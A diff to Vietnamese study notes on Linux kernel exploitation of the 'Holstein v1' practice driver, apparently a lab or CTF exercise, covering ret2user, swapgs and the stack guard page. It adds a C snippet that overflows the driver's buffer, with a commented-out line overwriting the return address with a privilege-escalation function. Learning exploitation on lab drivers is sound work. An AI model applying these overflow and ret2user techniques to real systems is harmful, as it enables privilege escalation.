@@ -1,8 +1,26 @@
 ## Holstein - v1
 ### ret2user
-- swapgs: Return to user space
+#### swapgs: Return to user space
+- Khi ta ghi đè return address của module write và nhảy về địa chỉ ở userland thì các thanh ghi vẫn ở kernel land nên ta sẽ lưu trạng thái các thanh ghi ở chương trình userland và khôi phục lại sau khi nhảy về và tiếp tục gọi hàm win
 - swap từ kernel space qua user space
-- stack page guard
+#### stack page guard 
+- Stack của kernel được mmaped theo đó là 1 page ở dưới để tránh việc buffer overflow khi ta đụng tới page này kernel sẽ panic
+```c
+static void exploit() {
+    int fd = open("/dev/holstein", O_RDWR);
+
+    char buf[0x1000];
+    memset(buf, 'A', 0x1000);
+    // *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
+    
+    write(fd, buf, 0x1000);
+    close(fd);
+
+    return;
+}
+```
+![image](https://hackmd.io/_uploads/rkrU7HOHyx.png)
+
 
 ### kROP
 - enable SMEP 
